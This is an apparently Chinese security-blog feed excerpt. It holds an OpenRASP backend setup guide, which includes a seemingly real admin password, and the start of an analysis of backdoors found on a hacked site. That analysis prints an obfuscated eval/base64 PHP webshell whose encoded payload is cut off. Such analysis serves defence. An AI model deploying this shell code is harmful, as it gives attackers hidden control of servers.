    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>上周一台web服务器部署单机版OpenRASP之后感觉还不错，想在公司内部推广一下，准备在一些后台系统的服务器上安装agent，单机版部署报警日志查看不是很方便，遂部署管理后台方便管理</p><span id="more"></span><h2 id="0x01-准备"><a href="#0x01-准备" class="headerlink" title="0x01 准备"></a>0x01 准备</h2><p>OpenRASP使用了 ElasticSearch 和 MongoDB 两种数据库。前者用来存储报警和统计信息，后者用来存储应用、账号密码等信息。</p><p>自己测试机上有mongodb 3.2 和 elk套件7.1.1，这里对数据库版本有要求</p><ul><li>MongoDB 版本大于等于 3.6</li><li>ElasticSearch 版本大于等于 5.6，小于 7.0</li></ul><p>好吧，都不符合，重新安装MongoDB 和 ElasticSearch</p><h3 id="MongoDB-安装"><a href="#MongoDB-安装" class="headerlink" title="MongoDB 安装"></a>MongoDB 安装</h3><p>官方手册：<a href="https://docs.mongodb.com/manual/tutorial/install-mongodb-on-red-hat/">https://docs.mongodb.com/manual/tutorial/install-mongodb-on-red-hat/</a></p><p>安装mongodb社区版，目前最新版为4.2</p><ol><li>创建仓库<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">vi</span> /etc/yum.repos.d/mongodb-org-<span class="number">4</span>.<span class="number">2</span>.repo</span><br></pre></td></tr></table></figure></li><li>复制<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[mongodb-org-<span class="number">4.2</span>]</span><br><span class="line">name=MongoDB Repository</span><br><span class="line">baseurl=https:<span class="regexp">//</span>repo.mongodb.org<span class="regexp">/yum/</span>redhat<span class="regexp">/$releasever/m</span>ongodb-org<span class="regexp">/4.2/</span>x86_64/</span><br><span class="line">gpgcheck=<span class="number">1</span></span><br><span class="line">enabled=<span class="number">1</span></span><br><span class="line">gpgkey=https:<span class="regexp">//</span>www.mongodb.org<span class="regexp">/static/</span>pgp/server-<span class="number">4.2</span>.asc</span><br></pre></td></tr></table></figure></li><li>yum命令安装mongodb<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum <span class="keyword">install</span> -y mongodb-org</span><br></pre></td></tr></table></figure></li><li>启动服务<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="literal">start</span> mongod</span><br></pre></td></tr></table></figure></li><li>使用<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mongo</span></span><br></pre></td></tr></table></figure></li><li>卸载<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yum erase <span class="constructor">$(<span class="params">rpm</span> -<span class="params">qa</span> | <span class="params">grep</span> <span class="params">mongodb</span>-<span class="params">org</span>)</span></span><br><span class="line">删除数据目录</span><br><span class="line">rm -r /var/log/mongodb</span><br><span class="line">rm -r /var/lib/mongo</span><br></pre></td></tr></table></figure></li><li>启用认证<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi <span class="meta-keyword">/etc/</span>mongod.conf</span><br><span class="line"><span class="symbol">security:</span></span><br><span class="line"><span class="symbol">  authorization:</span> enabled</span><br></pre></td></tr></table></figure></li></ol><h3 id="ElasticSearch-安装"><a href="#ElasticSearch-安装" class="headerlink" title="ElasticSearch 安装"></a>ElasticSearch 安装</h3><p><a href="https://www.elastic.co/cn/downloads/past-releases#elasticsearch">https://www.elastic.co/cn/downloads/past-releases#elasticsearch</a></p><p>下载6版本最新的 <a href="https://www.elastic.co/downloads/past-releases/elasticsearch-6-8-4">https://www.elastic.co/downloads/past-releases/elasticsearch-6-8-4</a></p><p><strong>不能使用root账户启动</strong></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="variable">@Honeypot</span> opt]<span class="comment"># useradd es684</span></span><br><span class="line">[root<span class="variable">@Honeypot</span> opt]<span class="comment"># chown -R es684:es684 /opt/elasticsearch-6.8.4/</span></span><br><span class="line">[root<span class="variable">@Honeypot</span> opt]<span class="comment"># su es684</span></span><br><span class="line">[es684<span class="variable">@Honeypot</span> opt]<span class="variable">$ </span>elasticsearch<span class="number">-6.8</span>.<span class="number">4</span>/bin/elasticsearch</span><br><span class="line"></span><br><span class="line">[root<span class="variable">@Honeypot</span> ~]<span class="comment"># curl http://127.0.0.1:9200</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;name&quot;</span> : <span class="string">&quot;pLQxhPa&quot;</span>,</span><br><span class="line">  <span class="string">&quot;cluster_name&quot;</span> : <span class="string">&quot;elasticsearch&quot;</span>,</span><br><span class="line">  <span class="string">&quot;cluster_uuid&quot;</span> : <span class="string">&quot;ZZHzhK93RvqBf2jzbTFtiQ&quot;</span>,</span><br><span class="line">  <span class="string">&quot;version&quot;</span> : &#123;</span><br><span class="line">    <span class="string">&quot;number&quot;</span> : <span class="string">&quot;6.8.4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;build_flavor&quot;</span> : <span class="string">&quot;default&quot;</span>,</span><br><span class="line">    <span class="string">&quot;build_type&quot;</span> : <span class="string">&quot;tar&quot;</span>,</span><br><span class="line">    <span class="string">&quot;build_hash&quot;</span> : <span class="string">&quot;bca0c8d&quot;</span>,</span><br><span class="line">    <span class="string">&quot;build_date&quot;</span> : <span class="string">&quot;2019-10-16T06:19:49.319352Z&quot;</span>,</span><br><span class="line">    <span class="string">&quot;build_snapshot&quot;</span> : <span class="keyword">false</span>,</span><br><span class="line">    <span class="string">&quot;lucene_version&quot;</span> : <span class="string">&quot;7.7.2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;minimum_wire_compatibility_version&quot;</span> : <span class="string">&quot;5.6.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;minimum_index_compatibility_version&quot;</span> : <span class="string">&quot;5.0.0&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;tagline&quot;</span> : <span class="string">&quot;You Know, for Search&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里两个数据库安装好了，开始安装管理后台</p><h2 id="0x02-管理后台安装"><a href="#0x02-管理后台安装" class="headerlink" title="0x02 管理后台安装"></a>0x02 管理后台安装</h2><ol><li>编辑 conf/app.conf 文件，修正 ElasticSearch 和 MongoDB 两个服务器的地址<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[prod]</span><br><span class="line">EsAddr = http://127.0.0.1:9200</span><br><span class="line">EsUser =</span><br><span class="line">EsPwd =</span><br><span class="line">MongoDBAddr = 127.0.0.1:27017</span><br><span class="line">MongoDBUser =</span><br><span class="line">MongoDBPwd =</span><br></pre></td></tr></table></figure></li></ol><ol start="2"><li>启动后台服务器:<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">./rasp-cloud</span> -d</span><br></pre></td></tr></table></figure></li><li>访问<br>在浏览器里打开 <a href="http://your-ip:8086/">http://your-ip:8086</a><br>登录管理后台。其中用户名固定为 openrasp，初始密码为 admin@123</li></ol><p>用户名：openrasp<br>密 码：!9cN!j!7fThP</p><p>系统设置 - 防护设置 - 关闭记录日志模式</p><p>系统设置 - 通用设置 - 自定义拦截状态码修改为404 ，自定义HTML响应内容修改为自己的404页面</p><h2 id="0x03-添加主机"><a href="#0x03-添加主机" class="headerlink" title="0x03 添加主机"></a>0x03 添加主机</h2><p>点击右上角添加主机，以PHP服务器为例</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">php</span> install.php -d /opt/rasp --app-id <span class="number">171</span>fea<span class="number">1</span>b<span class="number">56790016</span>e<span class="number">91239</span>b<span class="number">3</span>ede<span class="number">558</span>xxxxxxxxxx --app-secret KJIToQ<span class="number">9</span>VqdKq<span class="number">6</span>O<span class="number">0</span>dLxdG<span class="number">1</span>XbIHOxrLZF<span class="number">8</span>xxxxxxxxxxx --backend-url http://your-ip:<span class="number">8086</span></span><br></pre></td></tr></table></figure><p>重启PHP-FPM生效</p><img src="/openrasp-web/1.png" class="" title="描述">]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;上周一台web服务器部署单机版OpenRASP之后感觉还不错，想在公司内部推广一下，准备在一些后台系统的服务器上安装agent，单机版部署报警日志查看不是很方便，遂部署管理后台方便管理&lt;/p&gt;</summary>
    
    
    
    <category term="安全建设" scheme="http://www.pa55w0rd.online/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
    <category term="安全防护" scheme="http://www.pa55w0rd.online/tags/%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/"/>
    
  </entry>
  
  <entry>
    <title>一次php加密文件的分析</title>
    <link href="http://www.pa55w0rd.online/phpshell/"/>
    <id>http://www.pa55w0rd.online/phpshell/</id>
    <published>2019-11-01T03:21:07.000Z</published>
    <updated>2019-11-01T03:34:57.090Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>by 青衫磊落</p></blockquote><h3 id="0x00-缘生"><a href="#0x00-缘生" class="headerlink" title="0x00 缘生"></a>0x00 缘生</h3><p>某日下午正在美滋滋的把玩蚁剑，兄弟说站被入侵了，扫出了好几个后门，顿时来了兴趣。</p><span id="more"></span><img src="/phpshell/image-20191101084500415.png" class="" title="描述"><p>丢出来三个文件</p><p>第一个是常见的一句话：</p><img src="/phpshell/image-20191101084820982.png" class="" title="描述"><p>第二个也是常见的php shell，很熟悉的界面</p><img src="/phpshell/image-20191101095717613.png" class="" title="描述"><p>第三个文件，就有点怪了，为了方便兄弟们分析，我先直接贴一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">// qq1785995</span></span><br><span class="line"><span class="variable">$OOO0O0O00</span>=<span class="keyword">__FILE__</span>;<span class="variable">$OOO000000</span>=urldecode(<span class="string">&#x27;%74%68%36%73%62%65%68%71%6c%61%34%63%6f%5f%73%61%64%66%70%6e%72&#x27;</span>);<span class="variable">$OO00O0000</span>=<span class="number">24488</span>;<span class="variable">$OOO0000O0</span>=<span class="variable">$OOO000000</span>&#123;<span class="number">4</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">9</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">3</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">5</span>&#125;;<span class="variable">$OOO0000O0</span>.=<span class="variable">$OOO000000</span>&#123;<span class="number">2</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">10</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">13</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">16</span>&#125;;<span class="variable">$OOO0000O0</span>.=<span class="variable">$OOO0000O0</span>&#123;<span class="number">3</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">11</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">12</span>&#125;.<span class="variable">$OOO0000O0</span>&#123;<span class="number">7</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">5</span>&#125;;<span class="variable">$O0O0000O0</span>=<span class="string">&#x27;OOO0000O0&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>((<span class="variable">$$O0O0000O0</span>(<span class="string">&#x27;JE9PME9PMDAwMD0kT09PMDAwMDAwezE3fS4kT09PMDAwMDAwezEyfS4kT09PMDAwMDAwezE4fS4kT09PMDAwMDAwezV9LiRPT08wMDAwMDB7MTl9O2lmKCEwKSRPMDAwTzBPMDA9JE9PME9PMDAwMCgkT09PME8wTzAwLCdyYicpOyRPTzBPTzAwME89JE9PTzAwMDAwMHsxN30uJE9PTzAwMDAwMHsyMH0uJE9PTzAwMDAwMHs1fS4kT09PMDAwMDAwezl9LiRPT08wMDAwMDB7MTZ9OyRPTzBPTzAwTzA9JE9PTzAwMDAwMHsxNH0uJE9PTzAwMDAwMHswfS4kT09PMDAwMDAwezIwfS4kT09PMDAwMDAwezB9LiRPT08wMDAwMDB7MjB9OyRPTzBPTzAwME8oJE8wMDBPME8wMCwxMTQ3KTskT08wME8wME8wPSgkT09PMDAwME8wKCRPTzBPTzAwTzAoJE9PME9PMDAwTygkTzAwME8wTzAwLDM4MCksJ0k5TiswUUhSVGh2NUEvZDhZWjRYektmTXR1THkxcXJuamt4bGVwSjI2R2JCZ1dpN3dEbVNFYWNWM1BvT0ZzQ1U9JywnQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkrLycpKSk7ZXZhbCgkT08wME8wME8wKTs=&#x27;</span>)));<span class="keyword">return</span>;<span class="meta">?&gt;</span></span><br><span class="line">h0s8A+<span class="number">98</span>A+<span class="number">98</span>A+aSqRhn1JKwyHQlu4j2MasH4zDQMaF25NT2Tx3eXEs8A0FwXSIw5xT2Txw6h0s8XSIwA+<span class="number">98</span>ANjeXEFwXEFwA0FwvNZ8XS98XSIwA0F6h0FwA+<span class="number">98</span>A0FwANweXEFwA0FwA+Iwv4w24XpdvS9Z4QhzLRtaY4sedQpL/Qko4cu/qRKArXQD1JPbLVkguM9vAluRteh2KceVqEZWzEKktatSzHs8Z2/+KXE25Nq9Ye/<span class="number">0</span>ZzuR40pv4ED/XesYzKhXKQKfKakufJQxtcZpuJq6LfGByHaiyV9D12/EqMuVrRpoA+<span class="number">0</span>mASYa/l13d4g7hmeGv4eOuJ/gyV/pvNZ8A+IwXS98A+IGdcKctfw6h0s8A+<span class="number">98</span>A+<span class="number">98</span>ANeONJpitcDauHzjhm3i5V9gqMA7uHQEtf6i1HkwhSg/NJpitcDauHzjhm3i5V9gqMA7uHQEtfZx52961N1O+Y6euHQEtfZxT+Ej1HQS1V9712ZnuHKl12pwqNjeuHQEtfZx5NqTd0DGAEhaARu2/KK54QAcLXqH/KpaLMeVuSuH/Suhd0WTZSjVZSu2dHp2L+uaLf6cfKZuZcja/ehTZm1GdwEvLft6hHZkqHQetx0shQsXZKhfZKhyhEkzKQ9n40sXKNqqvYEvrwEvuMkGqNjGdwEvnYEvhHkEqR9gLM/ET+EjtMhmtMe6Nx1DhSEChcD7tcQgLHsSqN1gNx1mhSEChSAS/ltWAx3Vd+IPAmPlycE25I62Am1s8x1DdXTiAXt35lIi/S125I6GdwGJqfPlqHp7yx9YXzQnucKEufPcvNZctMhnyJQWu4ejrwGGuxI6LM/SuMY6hQsXZKhfZKhyhRuk1psitfapM4eGTRgv1JKEqMhiTNZnzEK4KeK4fmZctMhnyJQWuKEON2apyR/pLftjvHpS1cKEvNZnZzPffmZctMhnyJQWuKEGv49ON2hpqRKmyxIeMEKdKpgeqJQmMcPkyfKqdwGsufDSufpJTNk2uMZpy2t6hRuk1psitfapv4ejrwGmuMZa1J3jucKEufPcvNZctMhnyJQWu4eON2apyR/pLftjvHuayJ/ELfsiMcK3LM/E1mj2tM9ktckpMcqpqHKiqx1GTNtJtM9ktckpMcqpqHKiqxjeqJQmMcPkyfzgqRhau4eGTRgv1JKEqMhiTHQwtf/<span class="number">6</span>uKs2uMZpy2t6hRuk1psitfap5RZmqfzGdwGsN2hpqRKmyxI2hSgvnYGGuxI6ufawqRe6h0kzKQ9n40sXKNeGTRgvLftjvQ9/YKs2uMZpy2t6hEkzKQ9n40sXKN1Gv49ONxZTKQZYMEk8zaYj849YXzQnucKEufPcvNqTKQZYMEk8zaY2vXgvnfKg1czjrw6e4QZzzQsTXa/zT+E2hSgvnYGsNJsxMV/EtMhEvNq7tps2rJkkyJZguMT2vXgvLfPlyRKeuKs7yJ/pvNqlycaWyc3i1HkwhmeON2hp1MKG1JKnycPlu4I21csa1J/p5cuayJ/ELfsiMc/<span class="number">7</span>yfa7yxPwLRI2dwGGyJ/gqfZpMcsitcz6zas4XEsz5xqSyVKmtcz7u2KitVZGycPntVIi1HkwhmeONJpJvHuayJ/ELfsiMcK3LM/E1mj2rH/ktckpMV/pqN1GvMgvLfPlyRKeuKs7yJ/pvQ/nzes8KNIihV/<span class="number">7</span>qMhlu4slyHQS1mPltf/<span class="number">6</span>uKs3tcQlLHzi1HkwhmeON2apyR/prwGGyJ/gqfZpMcsitcz6zas4XEszTN321csa1J/p5c/gtM/SMc/ktckp52961N1GdwGsNJpJTNjeMa/+XEPH4zqy1JKkyHPkyfKqTNtJhR/wtf/pfcPkyfKqTNtJhR/wtf/pfcPkyfKSqHQEqM/qv49ONxZnzEqAXEh9XQg21VKwuKsa1cKmyJQWu4qqT+EjhR/wtf/pfVKSuMhitfapM4IsTNZS1HQluKWitfapMXgvnY6e1VQg84I21cKguf/ETN6ju2h7y4I252ZitfapvNqJucQWuKswLcT2v432T0s4Z0K4T0huTN1iqHPkyfz6hcu2tfapMV9Btx1G5x1itHpetN99zEAjX0p/<span class="number">4</span>KYjANIgT+<span class="number">0</span>jhSgvhRQauMhPT+EjhQsXZED8YeQAfmqetxqq5XPDqfKmr4jjhR/DyNIGdw6euHQEtXzsyMpS1fDnuJKEtckntMhmtMe6hRQauMhP5+<span class="number">0</span>Gdw6eLcsaLJpJuf3shHZkqH0afmqByVKbLfupyxqqdw6eyVZ6uMTj84ZetMZk/Kg2yVZ6uMT2MXgvhHu2umIsTNZetMZk/Kg2uJq2haEONJpJvNZByVKbLfupyxIFAN971xIeLcsaLJpJuf3j8XE2hmpOhHW7qfGGuJKiT+EjA+WsNJZpuJpiu4j2YzZ/<span class="number">4</span>zPn4zY25+<span class="number">0</span>Gdw6e1V9ktczj8492uMZS1HQlu4jeMa/RX0sNYzDyhV/a1HKnqfpehaEGdwGGuxje1V9ktcKyhVKGuNqqvMgvhR/Dy+Ejha/QX0K+KN9+XaKdKNjbv49Hzes/TN1iqHPkyfz6hcpiqJpEu41G5x1jKEkQzezjtRKGuHIshm3e1V9ktcKyhVKGuNqq5xTjtfPeTH9Jqfpet+<span class="number">32</span>A41jX0p/<span class="number">4</span>KYjA4TONxZDqfKmr4IsTNZnzEqAXEh9XQg2uHT2M4EC1MKp12e6TNZS1fwjvXgvhHZkqH0a8faP1VQgMcupqH/<span class="number">6</span>McQm1JQPvNZDqfKmr4wDvXgvhRpkyVQGyJqm1SEeuHQEtXKyhE/<span class="number">8</span>KzPzvN6GhaEON2apyR/prmZPtfsDLfP212AsA+WsNxZSLMZpqMhgT+EjucKE1cpEuMKmyNjGdw6e1JKVtMheT+EjucKE1JKVtMhevNqGy2uGqHKlycZphmwwvXgvhHQw1HpeT+EjufawqRe6hQsRZKZyhcQw1Nqqv4IUANIoTHpiqRukyNjeMEqQKQg2tM9whaEGdw6eLfPcLMZptM9wT+EjhHpiqJpEuKslycZpT+Ejhm1ONJpJvHKW1RZPvNZmuMqk1JZyhc/mufZGqNqqv49FnNZk1R9GuNejrw6e1JKVtMhefmql1JKeLMY2M4IsT+IONxZGy2uGqHKntcseu4IsTR/wtf/pMcWpr4je1V9ktczghHQw1HpevXgvnY6e1cpEuMKmyNIsTHqpqR/GqHKa1Jw6vXgvhR/wtf/pqMhgT+EjhR/GqHKa1JwihV/wtf/p52961+saLfYshm3eMa/RX0sNYzDyhV/a1HKnqfpehaEONxZWtfpgqJQmT+EjtMhmtMe6NxTFt4961JKJ8KwxhR/wtf/pqMhgMNTCTxPkqJQEtMT6hR/wtf/pfmqaLfY2M4w2yfpeuHDphmeihSw7tX3Ft2TChm3eMa/dfmZS1HQluKg2qfpehaaq5I6eMa/dfmZS1HQluKg2qfpehaaq5I6eMa/+XEPH4zqyhV/GqHKitfaphaEgNx125I62hmwvhR/wtf/pqMhg5I62hw6Gdw6etcseu4IsTR/E12Z7yHsVuMT61JQiuHsWv+tGvXgvhR/pqHQm1xIsTHQm1JQPvI62qfpehSEChQsXZED8YeQAfmqSqM9pMVKGuNqq5I62tcseu41s8xZlycZp5I62ufakLfw28XPStfZe1cDk1ckp1mjeqJQgqfzG5I62qRpwu41s8l0vvXgvhHakLfDctMhy/QEj84IxrmZSLMZpqMhgnfpiqJpEu4PwLRIUqXEe1V9ktcKyqfpeM4ukyMIOtSEeLfPcLMZpMc/<span class="number">7</span>uHKOhHpiqJpEufQw1RExdw6eyHKcufDSNXEjtMhmtMe6Nl0aANwm/XIgASzw5+YaANwa/XIg/lzw5+<span class="number">1</span>aANw3/XIgdXzw5+<span class="number">0</span>w/XIgAXTwANwDASzw5+<span class="number">0</span>aA+IgAXtaANwDd+Iw5+<span class="number">0</span>P/XIgAl0wANwmAlzw5+TEA+IgAlzaANwm/Szw5+TP/XIgAS0aANwSASzw5+Aa/XIgAS1aANwSdXzw5+YD/XIg/+AaANwE/Xzw5I6Ed+Iw5+zw/XIg/XAwANwa/Xzw5+z3A+Ig/lIaANwcASIw5+ta/XIg/ljwANwVA+zw5+<span class="number">1</span>S/XIg/StaANwVdXzw5+jm/XIgd+zaANw3d+zw5+eD/XIgdXYaANwP/Szw5+<span class="number">0</span>wA+zw5+<span class="number">0</span>w/XIw5+<span class="number">0</span>wdXzw5+<span class="number">0</span>D/+Iw5+<span class="number">0</span>Dd+zw5+<span class="number">0</span>mASIw5+<span class="number">0</span>m/Szw5+<span class="number">0</span>SAlIw5+<span class="number">0</span>S/lzw5+<span class="number">0</span>EAXIw5I6D/+zaANwD/X0aANwD/X1aANwD/lAaANwD/leaANwD/SzaANwDd+<span class="number">0</span>aANwDd+<span class="number">1</span>aANwDdXAaANwDdXeaANwmA+zaANwmAXAaANwmAl0aANwmAleaANwmAS1aANwm/+zaANwm/XAaANwm/l0aANwm/leaANwm/S1aANwmd+zaANwmdXtaANwSA+<span class="number">1</span>aANwSAXjaANwSAleaANwS/+IaANwS/X0aANwS/lTaANwS/SAaANwSd+YaANwSdXzaANwEAXIaANwEAlzaANwE/+IaANwE/XzaANwE/SIaANwEd+zaANwaA+IaANwaAXzaANwaASIaANwa/+zaAI6Gdw6eqfpeTIesT+ePdXePdXePdXgvhHK31IesT+IOdw6eyHKcufwh84IwdwGGuxjkufawqRe6hQsXZED8YeQAfmqWufaxuMT2M4ejhxtkufawqRe6hQsXZED8YeQAfmqWufaxuMT2MKg2qfpehaEGvMgvhRKGuNIsTNZnzEqAXEh9XQg2yfKWtJKmhaayhVKGuNqqdw6euMkwNXEjhQsXZED8YeQAfmqetxqq5XPmuM/ayRY6hQsXZED8YeQAfmqetxqq5XPDqfKmr4j2zEKAZz/zTHK31N9Hzes/TN1iqHPkyfz6hcu2tfapMcK31N1G5x1jKEkQzezjqfpe841ihRKGuNegANeONxZguMupyIesT+IONJu71xjeLXEwdmZG8+<span class="number">0</span>wA+geL4gBvMgvLft6hHK31NIC84IeyHKcufDSfmZGM4pONxZguMupyIesTNZGvS0ON2apyR/prwGx1JKkLSgvnYGsN2EvLftjvNQpyM9Er4jeMEqQKQg21VY2M4ejhxteMEqQKQg21VY2MXEshVhwhmpONxZ71NIsTNZnZEKzfmq71NqqdwGGuxI6ufawqRe6hHswv4ejrwGSLHsVyfKS1cQ2u4j2SB4cb/<span class="number">5</span>pW14V7yr6hmeON2EvLftjvNqmuM9gr41s84IeyVIjvYevrw6euJqGuIeh849Gy2Zctfw6hQsYXa/zfmqJucpehaEGdw6etcsiqHKiqIesTRZmLfE6hQsYXa/zfmqlycPEufPEhaEGdwGGuxI6ufawqRe6hH/<span class="number">7</span>y2Zpy2YGTNejrwGSLHsVyfKS1cQ2u4j2isx3WAXLm/cmiFX1SbbUa41GdwGsNJ/<span class="number">6</span>uf/ByHs2Lf36vXgvhHZkqH0j849k12hkr4jvhcu2LfY28X3euJqGuNwvhcu2qfpehSEChQsXZED8YeQAfmqSqM9pMVKGuNqq5I62uJqa1cKmyJQWu41s8xZnzEqAXEh9XQg21VKwuKsa1cKmyJQWu4qq5I62tcsiqHKiqN1s82ZmLfE6hQsYXa/zfmqlycPEufPEhaEG5I62uHQEufDGyJz28X3eMa/RX0sNYzDyhVZGyfKSqHQW1NqqNxeONxZmuM9grKsGuIesTHpi1cKmqRZktJDpvNqJucQWuKsmuM9gr41ghHZkqH0gA4eONxZS1fwj84I2KK90YKZQTN1iqHPkyfz6hcQw1QsJucQWufDG1VY2v43xTQ/QKN9muM9grKslyVKiq+amuM9grKslyVKiqNgDTQqTZKhQTHu2LfYj849OhHu2LfZsTNTONxZDqfKmr4IsTNZnzEqAXEh9XQg2uHT2M4EC1MKp12e6hR/DyNeON2/<span class="number">6</span>yVqWuM/StfqpvNnHwA5ygFJPGx1gTJu2tfap52961+sJucpe8MgeuJqGuREx5+<span class="number">0</span>GdwGsufDSufpJTNj21JKwyRpeufDpqHz28XEjhHswvMgvhHu2LfYh849Gy2Zctfw6hQsRZKZyhcu2LfY2M4eONxZGuIeh849Gy2Zctfw6hQsRZKZyhcpehaEGdwGGuxI6ufawqRe6hHu2LfYGTRDFufawqRe6hHpev4ejrwGSLHsVyfKS1cQ2u4j2ggOvUyXWS7A2vXgvnY6e1VQgT+Ejhm9SufDptVYjvx9J1JsWTN1iqHPkyfz6hcu2tfapMVhp1HDPhmeihm9VLHKmu49GuNIsTN1ihHpe5x1jhSgvhRQauMhPT+EjhQsXZED8YeQAfmqetxqq5XPDqfKmr4jjhR/DyNIGdw6eLfPJymIsTNZnzEqAXEh9XQg2uHT2M4ECuJKEtckntMhmtMe6TNZDqfKmr4IGdwGGuxI6ufawqRe6hHpiuJFGvYGON2/<span class="number">6</span>yVqWuM/StfqpvNnYD1CxgBiEPWXLiU5KVs5Z7bcDiFJCgUE25NqJucQWu4PwLRI2vXgvnY6e1VQgT+EjhEZQX0KzZ49Hzes/TN1iqHPkyfz6hcu2tfapMVhp1HDPhmeiTx9M40K4Z49GuNIsTRgeLfZsTNTONxZDqfKmr4IsTNZnzEqAXEh9XQg2uHT2M4EC1MKp12e6hR/DyNeONxZS1fDnuHKgT+EjhaKYZ0QzZ4I252ZitfapvNqk1R9nuJqkyfKgLM/EhmeiTx9XZKYj1JKwyRpntcsay2Ys1JKwyRpntcsay2YWA49M40K4Z49JucpeT+EjrmZJucpen4Ixdw6e1MKp12pnuHKgT+EjhQsXZED8YeQAfmqetxqq5XPDqfKmr4je1VQgMcZpyNeON2/<span class="number">6</span>yVqWuM/StfqpvNnh7B8sgFJPGbdkhmwxuJqkyfzi1Hkw8cu2LfYsrmZJucpen4TGdwGsNJpitcDauHKnycPlu4kXMah8XaYihm37uJqkyfz71JKwyRei1HkwhmeON2apyR/prw6euJqGuRAstMhmtMe6Nl0gAxwS5+Yg/<span class="number">4</span>wc5+<span class="number">1</span>gdNwP5+<span class="number">0</span>w5+<span class="number">0</span>D5+<span class="number">0</span>m5+<span class="number">0</span>S5+<span class="number">0E5</span>+<span class="number">0</span>a5+<span class="number">0</span>c5+<span class="number">0</span>V5+<span class="number">035</span>+<span class="number">0</span>P5+Tw5I6mA4wmAxwmAmwm/Nwm/<span class="number">4</span>wm/xwm/mwmdNwmd4wSANwSA4wSAxwSAmwS/NwS/<span class="number">4</span>wS/xwS/mwSdNwSd4wEANwv/+<span class="number">0</span>g/+Tg/+Ag/+Yg/+zg/+tg/+<span class="number">1</span>g/+jg/+eg/XIg/X0g/XTg/XAg/XYg/Xzg/Xtg/X1g/Xjg/Xeg/lIgNltD5+tm5+tS5+tE5+ta5+tc5+tV5+t35+tP5+<span class="number">1</span>w5+<span class="number">1</span>D5+<span class="number">1</span>m5+<span class="number">1</span>S5+<span class="number">1E5</span>+<span class="number">1</span>a5+<span class="number">1</span>c5+<span class="number">1</span>V5+<span class="number">135</span>+<span class="number">1</span>P5+jw5I63A4w3Axw3Amw3/Nw3/<span class="number">4</span>w3/xw3/mw3dNw3d4wPANwPA4wPAxwPAmwP/NwP/<span class="number">4</span>wP/xwP/mwPdNwPd4wDA+IgNl0wA4wDA+TgAXIS5+<span class="number">0</span>w/NwDA+zgAXIc5+<span class="number">0</span>w/mwDA+jgAXIP5+<span class="number">0</span>DANwDAX0gAX0m5+<span class="number">0</span>DAmwDAXYgAX0a5+<span class="number">0</span>D/xwDAX1gAX035+<span class="number">0</span>Dd4wDAlIgAXTD5+<span class="number">0</span>mAxwDAlAgAXTE5+<span 